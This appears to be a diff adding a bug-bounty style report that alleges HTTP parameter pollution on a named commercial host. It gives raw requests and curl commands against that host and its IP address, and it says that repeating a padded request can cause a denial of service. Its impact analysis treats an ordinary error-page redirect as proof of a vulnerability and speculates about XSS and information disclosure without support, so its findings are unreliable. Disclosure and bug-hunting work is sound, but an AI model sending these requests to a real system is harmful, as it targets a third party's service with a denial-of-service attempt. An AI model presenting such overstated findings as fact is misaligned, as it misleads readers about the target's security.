@@ -1,0 +1,58 @@
+Bug description
+
+Client-side HTTP parameter pollution (HPP) is a type of vulnerability that occurs when multiple values for the same parameter are injected into an HTTP request by a client. HPP attacks manipulate the parameter values in a way that can lead to unexpected behavior or security vulnerabilities in the target application.
+
+In a typical HTTP request, parameters are sent as part of the request URL or in the body of the request. These parameters are used by the server-side application to process the request and perform the necessary operations. However, in the case of HPP, an attacker deliberately modifies or adds extra values for a parameter in order to manipulate the application's behavior
+Exploitation
+
+GET /Error.aspx./n/are-you-hacked%26%3dYes HTTP/1.1
+
+Host: click.e.durex.com
+
+Accept-Encoding: gzip, deflate
+
+Accept: */*
+
+Accept-Language: en
+
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+
+Connection: close
+
+
+Performing following command multiple times can cause application DoS : curl -i -s -k -X $'GET' \
+
+   -H $'Host: click.e.durex.com' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Connection: close' \
+
+   $'https://13.111.149.170/Error.aspx./n/are-you-hacked%26%3dYesAAAAAAAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAA'
+PoC
+
+curl -X GET "http://click.e.durex.com/Error.aspx./n/are-you-hacked%26%3dYes" \
+
+-H "Host: click.e.durex.com" \
+
+-H "Accept-Encoding: gzip, deflate" \
+
+-H "Accept: */*" \
+
+-H "Accept-Language: en" \
+
+-H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" \
+
+-H "Connection: close"
+Impact
+
+    Redirection: The response code 302 indicates a redirection. The server is instructing the client to navigate to a different location specified in the "Location" header. In this case, the client should redirect to "/Error.aspx?aspxerrorpath=/Error.aspx./n/are-you-hacked&=Yes".
+    Potential Vulnerability: The response indicates that the original request resulted in an error and the server is redirecting to an error page ("/Error.aspx"). The presence of the appended parameter "?aspxerrorpath=/Error.aspx./n/are-you-hacked&=Yes" suggests that the application might be susceptible to parameter pollution. This could potentially lead to various security vulnerabilities, such as information disclosure, cross-site scripting (XSS), or server-side vulnerabilities.
+    HTML Content: The response body contains HTML content with a title "Object moved" and a message stating that the object has been moved to the specified location. The HTML response could potentially be rendered by the client's browser, and if there are any vulnerabilities present in the rendering or handling of HTML content, it may lead to additional security risks.
+
+
+Remediation
+
+To address this vulnerability, I recommend the following mitigation measures:
+
+    Input Validation and Sanitization: Implement strict input validation and sanitization mechanisms on the server-side to ensure that user-supplied data is properly handled and free from malicious content.
+    Parameter Name Uniqueness: Ensure that parameter names are unique in each request to prevent parameter pollution attacks.
+    Output Encoding: Implement proper output encoding when displaying user-supplied data to prevent cross-site scripting (XSS) attacks.
+
+
